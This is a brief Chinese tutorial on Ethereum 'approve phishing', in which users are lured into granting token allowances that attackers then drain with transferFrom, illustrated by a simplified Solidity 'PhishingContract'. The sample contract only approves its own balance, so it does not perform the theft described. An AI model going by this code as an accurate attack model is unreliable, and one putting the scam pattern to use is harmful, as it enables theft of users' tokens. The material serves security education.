# Approve钓鱼

在以太坊生态中，`approve` 函数允许用户授权特定地址（通常是智能合约）可以代表用户花费其资产。当用户调用 `approve` 时，他们指定一个地址和一个可以被该地址支配的代币数量。如果攻击者能够诱使用户调用其恶意合约的 `approve` 函数，便可以在用户不知情的情况下转移他们的代币。

## 示例攻击流程
1. **诱骗用户**：攻击者设计一个恶意合约，声称需要用户进行 `approve` 操作以完成某个合法的交易或活动。
2. **执行 `approve`**：用户在不知情的情况下调用恶意合约的 `approve` 函数。
3. **转移资产**：攻击者随后可以通过 `transferFrom` 函数转移用户授权的资产。


## 恶意合约

```solidity
contract GKBToken is ERC20 {
    // 初始化生成代币
    constructor(uint256 initialSupply) ERC20("GKBToken", "GKB") {
        _mint(msg.sender, initialSupply);
    }
}


contract PhishingContract {
    IERC20 public token;

    constructor(address _tokenAddress) {
        token = IERC20(_tokenAddress);
    }

    // 模拟钓鱼操作，诱导用户进行批准
    function phishingApprove(address dest , uint256 amount) external {
        // 诱导用户授权给恶意合约
        token.approve(dest, amount);
    }
}
```